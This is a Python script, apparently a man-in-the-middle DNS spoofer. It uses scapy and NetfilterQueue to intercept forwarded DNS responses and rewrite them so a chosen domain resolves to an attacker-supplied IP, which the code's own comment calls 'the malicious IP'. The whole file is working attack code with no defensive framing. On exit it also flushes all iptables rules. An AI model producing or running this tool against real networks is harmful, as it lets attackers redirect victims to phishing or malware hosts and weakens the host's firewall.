#!/usr/bin/env python3
import os
import netfilterqueue
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys

# Dictionary to store domain names and their spoofed IP addresses
dns_hosts = {}

# Process packets captured by NetfilterQueue
def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Convert packet to Scapy packet

    if scapy_packet.haslayer(DNSRR):  # Check if it's a DNS response
        qname = scapy_packet[DNSQR].qname
        print(f"[+] Before: {qname.decode()}")
        try:
            scapy_packet = modify_packet(scapy_packet)  # Modify the packet
        except Exception as e:
            print(e)

        packet.set_payload(bytes(scapy_packet))  # Update packet payload
    packet.accept()  # Forward the packet

# Modify the DNS response to redirect the target
def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname

    if qname not in dns_hosts:
        print("[!] No modification required...")
        return scapy_packet  # Return the packet unchanged

    # Spoof the DNS answer to redirect to the malicious IP
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1

    # Recalculate checksums and length fields
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum

    print(f"[+] After: {dns_hosts[qname]}")
    return scapy_packet

# Main program execution
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 dns_spoofer.py <domain> <spoofed_ip>")
        sys.exit(1)

    domain = sys.argv[1]
    spoofed_ip = sys.argv[2]
    dns_hosts[domain.encode() + b'.'] = spoofed_ip

    QUEUE_NUM = 0  # Netfilter queue number

    # Set up iptables rule to forward DNS packets to NetfilterQueue
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")

    nfq = netfilterqueue.NetfilterQueue()

    try:
        nfq.bind(QUEUE_NUM, process_packet)  # Bind queue
        nfq.run()  # Start processing packets
    except KeyboardInterrupt:
        os.system("iptables --flush")  # Flush iptables rules when interrupted
        print("[!] iptables rules flushed.")
